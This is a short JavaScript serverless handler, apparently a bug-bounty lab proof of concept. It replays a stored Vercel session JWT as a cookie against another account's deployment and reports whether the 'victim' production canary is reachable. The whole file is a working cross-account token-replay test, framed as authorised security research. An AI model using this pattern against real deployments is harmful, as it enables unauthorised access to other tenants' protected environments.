
export default async function handler(req, res) {
  const token = process.env.LAB_VERCEL_JWT;

  if (!token) {
    return res.status(500).json({
      error: "LAB_VERCEL_JWT is not configured"
    });
  }

  const target =
    "https://bb-vercel-lab-2026-git-main-hackerone-a-by-moraz.vercel.app/api/check";

  try {
    const response = await fetch(target, {
      method: "GET",
      headers: {
        Cookie: `_vercel_jwt=${token}`
      },
      redirect: "manual",
      cache: "no-store"
    });

    const body = await response.text();

    let parsed = null;

    try {
      parsed = JSON.parse(body);
    } catch {
      // Target response is not JSON.
    }

    return res.status(200).json({
      attacker: "ACCOUNT_B",
      victim: "ACCOUNT_A",
      attacker_environment: process.env.VERCEL_ENV || null,
      token_present: true,
      target_status: response.status,
      location_present: Boolean(
        response.headers.get("location")
      ),
      victim_production_detected:
        parsed?.environment === "production" &&
        parsed?.production_canary === "prod-canary-A-2026"
    });

  } catch (error) {
    return res.status(502).json({
      error: "Target request failed",
      message: String(error.message).slice(0, 300)
    });
  }
}
